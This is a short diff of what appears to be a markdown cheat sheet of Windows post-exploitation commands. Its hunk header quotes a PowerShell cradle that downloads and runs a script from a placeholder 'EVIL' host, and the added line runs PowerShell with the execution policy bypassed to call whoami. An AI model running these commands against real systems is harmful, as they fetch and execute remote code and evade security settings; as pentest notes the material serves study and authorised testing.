@@ -167,6 +167,8 @@ echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | pow
 - powershell
 ```
 powershell
+
+powershell -ExecutionPolicy ByPass -command "& { . whoami }"
 ```
 - systeminfo
 	* Gives us system info 
